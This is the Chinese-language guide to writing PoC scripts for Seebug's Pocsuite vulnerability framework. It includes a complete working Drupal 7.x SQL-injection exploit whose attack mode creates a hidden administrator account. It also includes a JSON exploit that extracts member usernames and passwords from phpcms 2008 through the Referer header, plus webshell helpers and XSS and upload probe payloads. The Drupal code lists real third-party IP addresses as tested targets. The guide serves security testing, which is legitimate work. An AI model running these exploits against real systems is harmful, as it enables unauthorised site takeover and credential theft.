```
                              ,--. ,--.         
 ,---. ,---. ,---.,---.,--.,--`--,-'  '-.,---.  
| .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : 
| '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --. 
|  |-' `---' `---`----' `----'`--' `--'  `----'  
`--'                                   seebug.org

```
PoC 编写说明文档
---
---

*   [概述](#overview)
*   [PoC python 脚本编写步骤](#pocpy)
*   [PoC json 脚本编写步骤](#pocjson)
*   [PoC 代码示例](#pocexample)
    *   [PoC py代码示例](#pyexample)
    *   [PoC json 代码示例](#jsonexample)
*   [PoC 规范说明](#pocstandard)
    *   [PoC 命名规范](#namedstandard)
    *   [Result 说明](#resultstandard)
    *   [漏洞类型规范](#vulcategory)
    *   [Webshell 类](#webshell)
    *   [弱口令相关](#weakpass)
*   [PoC 编写注意事项](#attention)


<h2 id="overview">概述</h2>
 本文档为 Pocsuite PoC 编写说明，Pocsuite 支持 python 和 json 两种格式的 PoC，本文档包含了两种格式的 PoC 编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [Pocsuite 使用说明帮助文档](../README.md)。


<h2 id="pocpy">PoC python脚本编写步骤:</h2>

本小节介绍POC python脚本编写

Pocsuite 支持 Python 2.7，如若编写 Python 格式的 PoC，需要开发者具备一定的 Python 基础

1. 首先新建一个.py文件,文件名应当符合 [PoC命名规范](#namedstandard)


2. 编写POC实现类TestPOC,继承自POCBase类.

    ```python
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    
    from pocsuite.net import req   #用法和 requests 完全相同
    from pocsuite.poc import Output, POCBase
    from pocsuite.utils import register
    
    class TestPOC(POCBase):
        ...
    
    ```
3. 填写 PoC 信息字段,**<font color=red>所有信息都要认真填写不然不会过审核的</font>**
   
    ```python
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'zhengdt' #  PoC作者的大名
    vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'# 编写 PoC 的日期
    updateDate = '2014-10-16'# PoC 更新的时间,默认和编写时间一样
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day不用写
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'# PoC 名称
    appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Drupal'# 漏洞应用名称
    appVersion = '7.x'# 漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    ```

4. 编写PoC检测代码

    ```python
    def _verify(self):
        output = Output(self)
        result = {} #result是返回结果
        # 验证代码
    ```
    ###### 返回结果result中的key值必须按照下面的规范来写:

    ```
    'Result':{
       'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
       'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
       'FileInfo':  {'Filename':'xxx','Content':'xxx'},
       'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
       'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
       'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
       'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
       'SiteAttr':  {'Process':'xxx'}
    }
    ```
    **result各字段意义请参见[Result 说明](#resultstandard)**
    
    output 为 Pocsuite 标准输出API，如果要输出调用成功信息则使用 `output.success(result)`,如果要输出调用失败则 `output.fail('Error Message')`
    
5. 编写攻击模式:

    攻击模式可以对目标进行 getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似

    ```python
    def _attack(self):
        output = Output(self)
        result = {}
        # 攻击代码
    ```

    和验证模式一样,攻击成功后需要把攻击得到结果赋值给result变量。

    **注意:如果该PoC没有攻击模式,可以在 \_attack()函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**
    
6. 注册PoC实现类

    在类的外部调用register()方法注册poc类
    ```
    Class TestPOC(POCBase):
        #POC内部代码
    
    #注册TestPOC类
    register(TestPOC)
    ```

<h2 id="pocjson">PoC json脚本编写步骤:</h2>

json 格式的 PoC 类似于完形填空,只需要填写相应的字段的值即可。**目前 json 支持的漏洞类型比较局限，如果想实现理复杂的业务逻辑，建议使用 Python**

1. 首先新建一个.json文件,文件名应当符合 **poc命名规范** 

2. poc json有两个key，pocInfo和pocExecute，分别代表poc信息部分执行体。

    ```
{
    "pocInfo":{},
    "pocExecute":{}
}
    ```

3. 填写pocInfo部分：

    ```
{
    "pocInfo":{
        "vulID": "poc-2015-0107",
        "name": "Openssl 1.0.1 内存读取 信息泄露漏洞",
        "protocol": "http",
        "author": "test",
        "references": ["http://drops.wooyun.org/papers/1381"],
        "appName": "OpenSSL",
        "appVersion" : "1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1",
        "vulType": "Information Disclosure",
        "desc" :"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据.",
        "samples": ["http://www.baidu.com", "http://www.qq.com"]
    },
    "pocExecute":{}
}   
    ```
    各字段的含义与python属性部分相同。

4. 填写pocExecute部分：
    pocExecute分为verify和attack两部分
    ```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[],
        "attack":[]
    }
}
    ```
    **填写verify部分:**
    ```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[
            {
                "step": "1",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=123&seebug=1234",
                "necessary": "",
                "headers": {"cookie": "123"},
                "status":"200",
                "match": {
                    "regex": ["baidu","google"],
                    "time": "time"
                }
            },
            {
                "step": "2",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=seebug",
                "necessary": "",
                "headers": "",
                "status": "200",
                "match":{
                    "regex": [""],
                    "time": "0.01"
                }
            }
        ],
        "attack":[]
    }
}
    ```
    >说明：
    
    >step: 按照上下顺序执行，值可以取0和非0两种。如果step的值为0,那么验证成功后就会返回成功，如果step的值不为0,那么需要全部满足后才返回成功。
    
    > method：请求方式
    
    > vulPath：请求路径
    
    > params：请求参数
    
    > necessary：请求中必须存在的数据，例如cookie
    
    > headers：自定义请求头部
    
    > status: 返回的 HTTP 状态码
    
    > match：返回体，其中：
    
    > > regex：表示字符串匹配，为数组类型，当且仅当regex中所有的元素都匹配成功的情况下，返回True，否则返回False."
    
    > > time：为时间差
    
    > > 当regex和time同时存在时，取regex，time失效。
    
    **verify中每个元素代表一个请求。**
        
    **填写attack部分:**
    ```
{
    "pocInfo":{},
    "pocExecute":{
        "verify":[],
        "attack":[
            {
                "step": "1",
                "method": "get",
                "vulPath": "/api.php",
                "params": "test=123&seebug=1234",
                "necessary": "",
                "headers": {"cookie": "123"},
                "status":"200",
                "match": {
                    "regex": ["baidu","google"],
                    "time": "time"
                },
                "result":{
                  "AdminInfo":{
                    "Password":"<regex>www(.+)com"
                  }
                }
            }        
        ]
    }
}
    ```
    attack部分和verify部分类似，比verify 部分多一个 "result".
    
    > "result": 为输出，其类型为 dict 
    
    > "AdminInfo": 是管理员信息，此项见 [Result 说明](#resultstandard)
    
    > "Password": 是result中 AdminInfo 中的字段，其值支持正则表达式，如果需要使用正则表达式来获取页面信息，则需要在表达式字符串前加`<regex>`


<h2 id="pocexample">PoC 代码示例</h2>

<h3 id="pyexample">PoC py代码示例</h3>

[Drupal 7.x /includes/database/database.inc SQL注入漏洞](http://www.seebug.org/vuldb/ssvid-88927) PoC:
```
#!/usr/bin/env python
# coding: utf-8
import urllib
import random
import string
from collections import OrderedDict

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '1571'  # vul ID
    version = '1'
    author = 'zhengdt'
    vulDate = '2014-10-16'
    createDate = '2014-10-16'
    updateDate = '2014-10-16'
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = '7.x'
    vulType = 'SQL Injection'
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    '''

    samples = ['http://216.119.147.168/', 'http://69.172.67.176/']

    def _attack(self):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        uid = int(random.random() * 1000)
        username = ''.join(random.sample(string.letters+string.digits, 5))
        payload = OrderedDict()

        if not self._verify(verify=False):
            return self.parse_attack(result)

        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
                 = 'test'
        payload['name[0]'] = 'test2'
        payload['pass'] = 'test'
        payload['form_id'] = 'user_login_block'

        #print urllib.urlencode(payload)
        response = req.post(vul_url, data=payload)
        if response.status_code == 200:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = 'thanks'

        return self.parse_attack(result)

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        payload = {
            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
                '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
                ')a);;#]': 'test',
            'name[0]': 'test2',
            'pass': 'test',
            'form_id': 'user_login_block',
        }

        response = req.post(vul_url, data=payload).content
        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)

```

<h3 id="jsonexample">PoC json代码示例</h3>
[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.seebug.org/vuldb/ssvid-62274) PoC:

由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Seebug漏洞详情搭建。

```
{
    "pocInfo": {
        "vulID": "62274",
        "version":"1",
        "vulDate":"2011-11-21",
        "createDate":"2015-09-15",
        "updateDate":"2015-09-15",
        "name": "phpcms_2008_ads_place.class.php_sql-inj",
        "protocol": "http",
        "vulType": "SQL Injection",
        "author": "Medici.Yan",
        "references": ["http://www.seebug.org/vuldb/ssvid-62274"],
        "appName": "phpcms",
        "appVersion" : "2008",
        "appPowerLink":"http://www.phpcms.cn",
        "desc" :"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注",
        "samples": ["http://127.0.0.1"]
    },

    "pocExecute":{
        "verify": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"},
                "status": "200",
                "match": {
                    "regex": ["c4ca4238a0b923820dcc509a6f75849b"],
                    "time":""
                }
            }
        ],
        "attack": [
            {
                "step": "0",
                "method": "get",
                "vulPath": "/data/js.php",
                "params": "id=1",
                "necessary": "",
                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"},
                "status":"200",                
                "match":{
                    "regex": ["Duplicate"],
                    "time": ""
                },
                "result":{
                    "AdminInfo":{
                        "Username":"<regex>--(.+)---",
                        "Password": "<regex>---(.+)--"
                    }
                }
            }
        ]
    }
}

```

使用json PoC 检测目标：

![verify](./images/poc_json_verify.png)

使用json PoC 攻击目标：
![attack](./images/poc_json_attack.png)


<h2 id="pocstandard">PoC 规范说明</h2>

<h3 id="namedstandard">PoC 命名规范</h3>

PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样 

```
    _1847_seeyon_3_1_login_info_disclosure.py
```

<h3 id="resultstandard">Result 说明</h3>

result 为 PoC 返回的数据类型，具体字段含义详细见 [Result 具体字段说明](#result)，例如:
```python
  #返回数据库管理员密码
  result['DBInfo']['Password']='xxxxx'
  #返回 Webshell 地址
  result['ShellInfo']['URL'] = 'xxxxx'
  #返回网站管理员用户名
  result['AdminInfo']['Username']='xxxxx'
```

<strong id="result">Result 具体字段说明</strong>：
```
result：[
    {  name: 'DBInfo'，        value：'数据库内容' }，
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value：'管理员密码' }，
        {  name: 'Salt'，          value: '加密盐值'},
        {  name: 'Uid'，           value: '用户ID'},
        {  name: 'Groupid'，       value: '用户组ID'},

    {  name: 'ShellInfo'，     value: 'Webshell信息'},
        {  name: 'URL'，           value: 'Webshell地址'},
        {  name: 'Content'，       value: 'Webshell内容'},

    {  name: 'FileInfo'，      value: '文件信息'},
        {  name: 'Filename'，      value: '文件名称'},
        {  name: 'Content'，       value: '文件内容'},

    {  name: 'XSSInfo'，       value: '跨站脚本信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Payload'，       value: '验证Payload'},

    {  name: 'AdminInfo'，     value: '管理员信息'},
        {  name: 'Uid'，           value: '管理员ID'},
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value: '管理员密码'},

    {  name: 'Database'，      value：'数据库信息' }，
        {  name: 'Hostname'，      value: '数据库主机名'},
        {  name: 'Username'，      value：'数据库用户名' }，
        {  name: 'Password'，      value: '数据库密码'},
        {  name: 'DBname'，        value: '数据库名'},

    {  name: 'VerifyInfo'，    value: '验证信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Postdata'，      value: '验证POST数据'},
        {  name: 'Path'，          value: '网站绝对路径'},

    {  name: 'SiteAttr'，      value: '网站服务器信息'},
    {  name: 'Process'，       value: '服务器进程'}

    ]
    
```


<h3 id="vulcategory">漏洞类型规范</h3>

<table border=1>
    <tr><td>英文名称</td><td>中文名称</td><td>缩写</td></tr>
    <tr><td>Cross Site Scripting </td><td> 跨站脚本 </td><td> xss</td></tr>
    <tr><td>Cross Site Request Forgery </td><td> 跨站请求伪造 </td><td> csrf</td></tr>
    <tr><td>SQL Injection </td><td> Sql注入 </td><td> sql-inj</td></tr>
    <tr><td>LDAP Injection </td><td> ldap注入 </td><td> ldap-inj</td></tr>
    <tr><td>Mail Command Injection </td><td> 邮件命令注入 </td><td> smtp-inj</td></tr>
    <tr><td>Null Byte Injection </td><td> 空字节注入 </td><td> null-byte-inj</td></tr>
    <tr><td>CRLF Injection </td><td> CRLF注入 </td><td> crlf-inj</td></tr>
    <tr><td>SSI Injection </td><td> Ssi注入 </td><td> ssi-inj</td></tr>
    <tr><td>XPath Injection </td><td> Xpath注入 </td><td> xpath-inj</td></tr>
    <tr><td>XML Injection </td><td> Xml注入 </td><td> xml-inj</td></tr>
    <tr><td>XQuery Injection </td><td> Xquery 注入 </td><td> xquery-inj</td></tr>
    <tr><td>Command Execution </td><td> 命令执行 </td><td> cmd-exec</td></tr>
    <tr><td>Code Execution </td><td> 代码执行 </td><td> code-exec</td></tr>
    <tr><td>Remote File Inclusion </td><td> 远程文件包含 </td><td> rfi</td></tr>
    <tr><td>Local File Inclusion </td><td> 本地文件包含 </td><td> lfi</td></tr>
    <tr><td>Abuse of Functionality </td><td> 功能函数滥用 </td><td> func-abuse</td></tr>
    <tr><td>Brute Force </td><td> 暴力破解 </td><td> brute-force</td></tr>
    <tr><td>Buffer Overflow </td><td> 缓冲区溢出 </td><td> buffer-overflow</td></tr>
    <tr><td>Content Spoofing </td><td> 内容欺骗 </td><td> spoofing</td></tr>
    <tr><td>Credential Prediction </td><td> 证书预测 </td><td> credential-prediction</td></tr>
    <tr><td>Session Prediction </td><td> 会话预测 </td><td> session-prediction</td></tr>
    <tr><td>Denial of Service </td><td> 拒绝服务 </td><td> dos</td></tr>
    <tr><td>Fingerprinting </td><td> 指纹识别 </td><td> finger</td></tr>
    <tr><td>Format String </td><td> 格式化字符串 </td><td> format-string</td></tr>
    <tr><td>HTTP Response Smuggling </td><td> http响应伪造 </td><td> http-response-smuggling</td></tr>
    <tr><td>HTTP Response Splitting </td><td> http响应拆分 </td><td> http-response-splitting</td></tr>
    <tr><td>HTTP Request Splitting </td><td> http请求拆分 </td><td> http-request-splitting</td></tr>
    <tr><td>HTTP Request Smuggling </td><td> http请求伪造 </td><td> http-request-smuggling</td></tr>
    <tr><td>HTTP Parameter Pollution </td><td> http参数污染 </td><td> hpp</td></tr>
    <tr><td>Integer Overflows </td><td> 整数溢出 </td><td> int-overflow</td></tr>
    <tr><td>Predictable Resource Location </td><td> 可预测资源定位 </td><td> res-location</td></tr>
    <tr><td>Session Fixation </td><td> 会话固定 </td><td> session-fixation</td></tr>
    <tr><td>URL Redirector Abuse </td><td> url重定向 </td><td> redirect</td></tr>
    <tr><td>Privilege Escalation </td><td> 权限提升 </td><td> privilege-escalation</td></tr>
    <tr><td>Resolve Error </td><td> 解析错误 </td><td> resolve-error</td></tr>
    <tr><td>Arbitrary File Creation </td><td> 任意文件创建 </td><td> file-creation</td></tr>
    <tr><td>Arbitrary File Download </td><td> 任意文件下载 </td><td> file-download</td></tr>
    <tr><td>Arbitrary File Deletion </td><td> 任意文件删除 </td><td> file-deletion</td></tr>
    <tr><td>Backup File Found </td><td> 备份文件发现 </td><td> bak-file-found</td></tr>
    <tr><td>Database Found </td><td> 数据库发现 </td><td> db-found</td></tr>
    <tr><td>Directory Listing </td><td> 目录遍历 </td><td> dir-listing</td></tr>
    <tr><td>Directory Traversal </td><td> 目录穿越 </td><td> dir-traversal</td></tr>
    <tr><td>File Upload </td><td> 文件上传 </td><td> file-upload</td></tr>
    <tr><td>Login Bypass </td><td> 登录绕过 </td><td> login-bypass</td></tr>
    <tr><td>Weak Password </td><td> 弱密码 </td><td> weak-pass</td></tr>
    <tr><td>Remote Password Change </td><td> 远程密码修改 </td><td> remote-pass-change</td></tr>
    <tr><td>Code Disclosure </td><td> 代码泄漏 </td><td> code-disclosure</td></tr>
    <tr><td>Path Disclosure </td><td> 路径泄漏 </td><td> path-disclosure</td></tr>
    <tr><td>Information Disclosure </td><td> 信息泄漏 </td><td> info-disclosure</td></tr>
    <tr><td>Security Mode Bypass </td><td> 安全模式绕过 </td><td> sec-bypass</td></tr>
    <tr><td>Malware </td><td> 挂马 </td><td> mal</td></tr>
    <tr><td>Black Link </td><td> 暗链 </td><td> black-link</td></tr>
    <tr><td>Backdoor </td><td> 后门 </td><td> backdoor</td></tr>
    
</table>

也可以参见[漏洞类型规范](http://seebug.org/category)


<h3 id="webshell">WebShell类</h3>
Pocsuite提供两个类来快速生成WebShell。具体代码见：lib/utils/webshell.py

WebShell类：

```
class Webshell:
    #基础Webshell类
    # @pwd :    Webshell密码 
    # @content: Webshell代码
    # @check:   检验代码
    # @keyword: 检验特征关键字
    __init__(self, pwd='', content='', check='', keyword='')
    
    set_pwd(self, pwd)#设置webshell密码
    get_pwd(self)     #获取webshell密码
    get_content(self) #获取webshell代码
    check(self, url)  #校验执行结果
        
```

VerifyShell类：

```
class VerifyShell(Webshell):

    def __init__(self, content='', keyword=''):
        Webshell.__init__(self, content=content, keyword=keyword)
        self._check_data = {}
```

pocsuite中封装了常用的一句话WebShell，默认密码均为cmd。如果需要在页面中直接调用webshell，需要引入webshell类。
如：使用PhpShell类
```
from lib.utils.webshell import PhpShell
```
如果需要自定义WebShell，可以继承WebShell类。
如果需要自定义VerifyShell,可以继承VerifyShell类。

<h3 id="weakpass">弱口令相关</h3>

引入API:
```
from lib.utils.password import *
```
相关API:
```
#默认返回top前100弱口令
getWeakPassword()
#默认返回top前1000弱口令
getLargeWeakPassword()
#生成密码字典
genPassword(length=8, chars=string.letters+string.digits)

```
相关的密码文件在 pocsuite/data 目录下，如果需要修改字典位置，可以修改paths.WEAK_PASS属性和paths.LARGE_WEAK_PASS 属性值。


<h2 id="attention">PoC 编写注意事项</h2>
1. 检测模式为了防止误报的产生,我们一般使用的让页面输出一个自定义的字符串。

    比如:

    检测 SQL 注入时,select md5(0x2333333)

        if '5e2e9b556d77c86ab48075a94740b6f7' in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+payload
    检测 XSS 漏洞时alert('<0x2333333>')
    
        if '<0x2333333>' in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+payload
    检测 PHP 文件上传是否成功。<?php echo md5(0x2333333);unlink(__FILE__);?>
    
        if '5e2e9b556d77c86ab48075a94740b6f7' in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+payload
2. 任意文件如果需要知道网站路径才能读取文件的话,可以读取系统文件进行验证,要写 Windows 版和 Linux 版两个版本。

3. 检测模式下,上传的文件一定要删掉

4. 程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀

5. PoC 编写好后，务必进行测试，测试规则为：5个不受漏洞的网站，确保 PoC 攻击不成功；5个受漏洞影响的网站，确保 PoC 攻击成功。
